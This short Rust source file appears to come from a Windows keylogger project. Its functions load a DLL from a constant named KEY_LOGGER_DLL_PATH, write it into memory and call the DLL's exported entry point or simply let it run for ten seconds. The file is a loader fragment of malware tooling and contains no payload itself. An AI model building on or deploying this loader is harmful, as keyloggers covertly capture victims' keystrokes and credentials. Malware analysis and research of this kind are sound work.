use core::time;
use std::thread;

use windows::Win32::Foundation::HMODULE;

use crate::dll;

pub fn call_dll_exported_function() {
    dll::dll_utils::execute_dll(allocate_with_handle(), dll::dll_utils::DLL_ENTRY_POINT);
}

pub fn call_dll_main() {
    allocate_with_handle();
    let ten_millis = time::Duration::from_secs(10);

    thread::sleep(ten_millis);
}

fn allocate_with_handle() -> HMODULE {
    match dll::dll_utils::allocate_and_write_dll_address(dll::dll_utils::KEY_LOGGER_DLL_PATH) {
        Ok(p) => p,
        Err(e) => {
            panic!("{}", e)
        }
    }
}
